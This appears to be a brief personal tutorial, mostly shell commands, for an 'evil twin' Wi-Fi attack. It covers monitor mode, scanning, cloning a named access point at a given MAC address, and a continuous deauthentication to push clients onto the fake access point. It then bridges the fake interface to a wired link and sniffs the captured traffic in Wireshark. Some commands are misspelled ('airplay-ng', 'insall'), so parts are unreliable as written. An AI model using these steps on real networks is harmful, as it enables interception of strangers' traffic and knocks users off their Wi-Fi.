# Evil Twin Attack

Evil twin is local fake assess point

## Monitor mode
```bash
sudo airmon-ng start wlan0mon

```
## Scan all the wireless access points

```bash
sudo airodump-ng wlan0mon

```
## Find the assessing point you want to clone

### Create a fake assessing point 
```bash
airbase-ng -a  50:1D:93:98:0F:BC -e Ansari -c 10  wlan0mon
```

### forcing client to disconnect & connect to the fake asses point
```
airplay-ng -0 0 -a 60:F6:77:82:7B:BB wlan0mon
```
### giving hotspot from the fake assess point 
```bash
apt-get insall bridge-utils
```
### after installaton
```
brctl addbr fake
# creating bridge between etho and fake
brctl addif fake eth0

# Adding interface which is created by airbase-ng
brctl addif fake at0
# Adding ip addresses to interdaces
ifconfig at0 0.0.0.0 up
ifconfig fake up

```
## you can listen to fake traffic using wireshark


